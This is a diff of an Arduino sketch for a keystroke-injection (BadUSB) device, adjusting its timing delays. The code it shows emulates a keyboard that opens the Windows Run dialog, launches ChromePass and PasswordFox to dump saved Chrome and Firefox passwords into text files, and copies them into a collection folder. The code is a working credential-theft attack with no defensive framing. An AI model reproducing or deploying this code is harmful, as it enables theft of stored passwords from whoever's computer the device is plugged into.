@@ -2,7 +2,7 @@
 
 void typeKey(int key) {
   Keyboard.press(key);
-  delay(50);
+  delay(100);
   Keyboard.release(key);
 }
 
@@ -10,8 +10,8 @@ void setup() {
   // Begining the Keyboard stream
   Keyboard.begin();
 
-  // Wait 500ms
-  delay(400);
+  // Wait 600ms
+  delay(600);
   
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -41,10 +41,10 @@ void setup() {
   delay(100);
   Keyboard.print("ChromePass.exe /stext ChromePass.txt");
   typeKey(KEY_RETURN);
-  delay(8000);
+  delay(100);
   Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
   typeKey(KEY_RETURN);
-  delay(8000);
+  delay(5000);
   Keyboard.print("for %I in (ChromePass.txt PasswordFox.txt) do copy %I c:\\chrome\\Password");
   typeKey(KEY_RETURN);
   delay(1000);
